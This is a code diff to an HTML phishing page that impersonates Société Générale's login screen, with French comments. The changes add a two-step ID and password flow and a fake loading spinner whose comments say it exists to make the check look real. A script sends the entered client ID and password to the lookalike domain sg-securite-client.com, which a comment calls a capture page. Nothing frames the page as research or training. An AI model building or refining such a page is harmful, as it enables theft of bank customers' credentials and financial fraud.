@@ -25,9 +25,10 @@
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
+            position: relative;
         }
 
-        /* LOGO SG (Utilise le logo SVG officiel qui est Rouge et Noir) */
+        /* LOGO SG */
         .logo {
             width: 150px;
             margin-bottom: 30px;
@@ -36,7 +37,7 @@
         /* TITRE */
         h1 {
             font-size: 22px;
-            color: #000000; /* Noir */
+            color: #000000;
             margin-bottom: 20px;
             font-weight: 600;
         }
@@ -45,6 +46,17 @@
         .form-group {
             margin-bottom: 20px;
             text-align: left;
+            display: none; /* Caché par défaut */
+        }
+
+        .form-group.active {
+            display: block; /* Affiché si classe active */
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         label {
@@ -91,10 +103,29 @@
             cursor: pointer;
             transition: background-color 0.3s;
             margin-top: 10px;
+            display: none; /* Caché par défaut */
+        }
+
+        .btn-login.active {
+            display: block;
         }
 
         .btn-login:hover {
-            background-color: #c50510; /* Rouge plus foncé au survol */
+            background-color: #c50510;
+        }
+
+        /* BOUTON SUIVANT (ÉTAPE 1) */
+        .btn-next {
+            width: 100%;
+            padding: 14px;
+            background-color: #E30613;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
         }
 
         /* LIENS EN BAS */
@@ -104,7 +135,7 @@
         }
 
         .links a {
-            color: #005699; /* Bleu pour les liens secondaires (standard web) ou Rouge si tu préfères */
+            color: #005699;
             text-decoration: none;
             display: block;
             margin-bottom: 8px;
@@ -122,41 +153,102 @@
             border-top: 1px solid #eee;
             padding-top: 15px;
         }
+
+        /* CHARGEMENT */
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #E30613;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <!-- LOGO SG (Le SVG officiel contient le rouge et le noir) -->
-        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" class="logo">
+        <!-- LOGO SG -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="Société Générale Logo" class="logo">
 
         <h1>Connexion</h1>
 
-        <!-- FORMULAIRE -->
-        <form action="https://sg-securite-client.com" method="GET">
-            
-            <div class="form-group">
-                <label for="client_id">Identifiant (Chiffres)</label>
-                <input type="number" id="client_id" name="client_id" placeholder="Ex: 12345678" required>
-            </div>
+        <!-- ÉTAPE 1 : IDENTIFIANT -->
+        <div id="step1" class="form-group active">
+            <label for="client_id">Identifiant (Chiffres)</label>
+            <input type="number" id="client_id" name="client_id" placeholder="Ex: 12345678" required>
+            <button type="button" class="btn-next" onclick="goToStep2()">Suivant</button>
+        </div>
 
-            <div class="form-group">
-                <label for="password">Mot de passe (Chiffres)</label>
-                <input type="number" id="password" name="password" placeholder="Ex: 12345" required>
-            </div>
+        <!-- CHARGEMENT (Optionnel, pour faire croire que ça vérifie) -->
+        <div id="loader" class="loader"></div>
 
-            <button type="submit" class="btn-login">Se connecter</button>
+        <!-- ÉTAPE 2 : MOT DE PASSE -->
+        <div id="step2" class="form-group">
+            <label for="password">Mot de passe (Chiffres)</label>
+            <input type="number" id="password" name="password" placeholder="Ex: 12345" required>
+            <button type="submit" class="btn-login active" onclick="submitForm()">Se connecter</button>
+        </div>
 
-            <div class="links">
-                <a href="#">Mot de passe oublié ?</a>
-                <a href="#">Première connexion</a>
-            </div>
-        </form>
+        <div class="links">
+            <a href="#">Mot de passe oublié ?</a>
+            <a href="#">Première connexion</a>
+        </div>
 
         <div class="footer">
             <p>&copy; 2026 Société Générale. Tous droits réservés.</p>
         </div>
     </div>
+
+    <script>
+        function goToStep2() {
+            const idInput = document.getElementById('client_id');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const loader = document.getElementById('loader');
+
+            if (idInput.value.length < 1) {
+                idInput.style.borderColor = '#E30613';
+                return;
+            }
+
+            // Cacher étape 1
+            step1.classList.remove('active');
+            
+            // Montrer le chargement pendant 1 seconde (pour faire réaliste)
+            loader.style.display = 'block';
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                step2.classList.add('active');
+                // Mettre le focus sur le champ mot de passe
+                document.getElementById('password').focus();
+            }, 800); // 800ms de délai
+        }
+
+        function submitForm() {
+            const passwordInput = document.getElementById('password');
+            const password = passwordInput.value;
+            const clientId = document.getElementById('client_id').value;
+
+            if (password.length < 1) {
+                passwordInput.style.borderColor = '#E30613';
+                return;
+            }
+
+            // Redirection vers ta page de capture ou ton site
+            // Ici, on redirige vers la même page avec les paramètres dans l'URL
+            // Tu pourras récupérer ces données si tu ajoutes un script de capture plus tard
+            window.location.href = "https://sg-securite-client.com?client_id=" + clientId + "&password=" + password;
+        }
+    </script>
 
 </body>
 </html>
